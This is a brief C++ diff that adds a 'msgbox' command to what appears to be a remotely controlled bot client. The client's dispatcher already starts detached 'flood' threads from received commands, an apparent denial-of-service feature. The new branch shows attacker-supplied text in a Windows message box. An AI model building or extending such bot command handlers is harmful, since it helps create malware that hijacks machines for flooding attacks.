@@ -38,6 +38,11 @@ int main()
 				std::thread(flood, data).detach();
 			}
 		}
+
+		else if (strcmp(data.command, "msgbox") == 0)
+		{
+			MessageBoxA(0, data.first_option, data.second_option, 0);
+		}
 	}
 
 	return 0;
